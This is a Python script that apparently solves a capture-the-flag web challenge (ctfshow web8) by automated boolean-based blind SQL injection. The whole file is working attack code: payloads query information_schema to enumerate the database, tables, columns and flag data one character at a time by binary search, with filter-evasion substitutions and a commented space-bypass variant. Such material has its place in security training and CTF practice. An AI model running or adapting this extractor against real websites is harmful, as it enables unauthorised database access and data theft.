# ctfshow-web8, 过滤了 (and| |,)
import time
from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://48cdd46d-ebec-4b66-806d-bf12da1ee013.challenge.ctf.show:8080/index.php?id=0'
flag_success = 'I asked nothing'

payload1_database_length = ' or length(database())={}'
payload_database = ' or ord(substr(database() from {} for 1))>{}'
payload_table = ' or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {} for 1))>{}'
payload_column = ' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}") from {} for 1))>{}'
payload_data = ' or ord( SUBSTR((select group_concat({}) from {}) from {} for 1))>{}'

start_time = time.time()

session = HTMLSession()
proxies = {}


def go(title, payload):
    db = ''
    for i in range(1, 128):
        s = search(i, payload)
        if not 32 < ord(s) <= 128:
            break
        db += s
        print(f'{title} = ', db)

def fuzz(func):
    def inner(*args, **kwargs):
        [index, payload] = list(args)
        import json
        f = open('sql_fuzz.json', 'r').read()
        obj = json.loads(f) # type:dict
        for k,v in obj.items():
            payload = payload.replace(k, v)
        lst = [index, payload]
        return func(*lst, **kwargs)
    return inner

@fuzz
def search(index, payload):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        sql = url + payload.format(index, mid)
        # sql = url + "/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#" % (str(index),str(mid))

        res = session.get(sql)
        if flag_success in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        if mid == 32:
            break
    return chr(mid)


if __name__ == '__main__':
    table_name = 'flag'
    column_name = 'flag'

    # go('database', payload_database)  # 'kanwolongxia'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name, '{}', '{}'))  # Id,flaglo
    go('data', payload_data.format(column_name, table_name, '{}', '{}'))
    print("--- %s seconds ---" % (time.time() - start_time))
